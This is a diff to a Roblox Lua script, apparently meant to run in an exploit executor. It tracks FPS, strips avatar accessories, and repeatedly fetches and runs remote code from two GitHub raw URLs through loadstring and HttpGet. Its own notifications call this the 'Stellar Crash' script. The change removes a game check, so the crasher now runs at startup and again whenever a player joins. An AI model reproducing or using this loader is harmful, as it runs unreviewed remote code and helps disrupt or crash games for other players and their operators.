@@ -17,24 +17,16 @@ fpsLabel.Font = Enum.Font.SourceSans
 fpsLabel.TextSize = 20
 fpsLabel.Text = "FPS: 0"
 
--- Function to check if the game contains "Bloxbiz"
-local function checkForBloxbiz()
-    for _, item in ipairs(ReplicatedStorage:GetDescendants()) do
-        if item.Name:lower():find("bloxbiz") then
-            return true
-        end
-    end
-    return false
-end
-
--- Function to remove all accessories from a player's character
-local function removeAllAccessoriesFromPlayer(player)
-    local character = player.Character or player.CharacterAdded:Wait()
-
-    -- Iterate through all descendants of the character and remove any accessories
-    for _, item in pairs(character:GetDescendants()) do
-        if item:IsA("Accessory") then
-            item:Destroy()  -- Remove the accessory instantly
+-- Function to remove all accessories from all players
+local function removeAllAccessories()
+    for _, player in pairs(Players:GetPlayers()) do
+        local character = player.Character
+        if character then
+            for _, item in pairs(character:GetDescendants()) do
+                if item:IsA("Accessory") then
+                    item:Destroy()
+                end
+            end
         end
     end
 end
@@ -44,7 +36,7 @@ local frames = 0
 local fps = 0
 local lastUpdateTime = tick()
 
--- Function to update FPS and remove accessories from all players if FPS drops below 20
+-- Function to update FPS and remove accessories instantly if FPS drops below 20
 RunService.RenderStepped:Connect(function()
     frames = frames + 1
 
@@ -59,88 +51,72 @@ RunService.RenderStepped:Connect(function()
 
         -- Check if FPS is below 20 and remove accessories instantly if necessary
         if fps < 20 then
-            -- Remove accessories from all players
-            for _, plr in pairs(Players:GetPlayers()) do
-                removeAllAccessoriesFromPlayer(plr)
-            end
+            removeAllAccessories()
             StarterGui:SetCore("SendNotification", {
                 Title = "Low FPS Detected",
-                Text = "FPS dropped below 20. Accessories removed from all players.",
+                Text = "FPS dropped below 20. Accessories removed.",
                 Duration = 5
             })
         end
     end
 
-    -- Loop to keep removing accessories and refreshing the anti-lag every frame
-    if checkForBloxbiz() then
-        -- Remove accessories from all players continuously in RenderStepped loop
-        for _, plr in pairs(Players:GetPlayers()) do
-            removeAllAccessoriesFromPlayer(plr)
-        end
-    end
+    -- Continuous accessory removal for optimization
+    removeAllAccessories()
 end)
 
--- Check if "Bloxbiz" is present in the game
-if checkForBloxbiz() then
-    -- Notify the player that the game is supported
-    StarterGui:SetCore("SendNotification", {
-        Title = "Game Supported",
-        Text = "This game contains Bloxbiz and is supported.",
-        Duration = 5
-    })
+-- URLs for loadstring alternation
+local loadstringUrls = {
+    "https://raw.githubusercontent.com/stellar-dv/stellar/refs/heads/main/semiuvcrasher.txt",
+    "https://raw.githubusercontent.com/stellar-dv/stellar/refs/heads/main/c.txt"
+}
+local currentUrlIndex = 1
 
-    -- Execute the loadstring for the anti-lag script once at the start
+-- Function to execute the loadstring and notify
+local function executeStellarCrash()
     local success, err = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/stellar-dv/stellar/refs/heads/main/semiuvcrasher.txt"))()
+        loadstring(game:HttpGet(loadstringUrls[currentUrlIndex]))()
     end)
 
     if success then
-        -- Notify the player that the anti-lag script was executed
         StarterGui:SetCore("SendNotification", {
-            Title = "Stellar Crasher Executed",
-            Text = "The crash script has been executed.",
+            Title = "Refreshing Stellar Crash",
+            Text = "The crash script has been refreshed using a new configuration.",
             Duration = 5
         })
     else
         warn("Failed to execute the script: " .. err)
     end
 
-    -- Execute the loadstring every 5 seconds in a loop, and show the "Refreshing Stellar Crash" notification
-    while true do
-        wait(5)  -- Wait for 5 seconds before executing again
-        local success, err = pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/stellar-dv/stellar/refs/heads/main/c.txt"))()
-        end)
-        if not success then
-            warn("Failed to execute the script: " .. err)
-        else
-            -- Notify the player every time the script is executed with a new notification
-            StarterGui:SetCore("SendNotification", {
-                Title = "Refreshing Stellar Crash",
-                Text = "The script has been refreshed and executed.",
-                Duration = 5
-            })
-        end
-    end
-else
-    -- Notify the player that the game is not supported
-    StarterGui:SetCore("SendNotification", {
-        Title = "Game Not Supported",
-        Text = "This game does not contain Bloxbiz.",
-        Duration = 5
-    })
+    -- Alternate the URL index for the next execution
+    currentUrlIndex = currentUrlIndex == 1 and 2 or 1
 end
 
--- Optional: Remove accessories when a player respawns
-Players.PlayerAdded:Connect(function(plr)
-    plr.CharacterAdded:Connect(function()
-        if checkForBloxbiz() then
-            removeAllAccessoriesFromPlayer(plr)  -- Instant removal of accessories from the player
-            StarterGui:SetCore("SendNotification", {
-                Title = "Accessories Removed",
-                Text = "All accessories have been removed from your character.",
-                Duration = 5
-            })
-        end
+-- Execute the loadstring once at the start
+StarterGui:SetCore("SendNotification", {
+    Title = "Stellar Crash Initialized",
+    Text = "The crash script has been executed for the first time.",
+    Duration = 5
+})
+executeStellarCrash()
+
+-- Listen for new players joining and execute the loadstring again
+Players.PlayerAdded:Connect(function(player)
+    StarterGui:SetCore("SendNotification", {
+        Title = "New Player Joined",
+        Text = player.Name .. " joined the game. Refreshing Stellar Crash.",
+        Duration = 5
+    })
+    executeStellarCrash()
+end)
+
+-- Optional: Notify when accessories are removed after respawn
+Players.PlayerAdded:Connect(function(player)
+    player.CharacterAdded:Connect(function()
+        removeAllAccessories()
+        StarterGui:SetCore("SendNotification", {
+            Title = "Accessories Removed",
+            Text = "All accessories have been removed for " .. player.Name .. ".",
+            Duration = 5
+        })
     end)
 end)
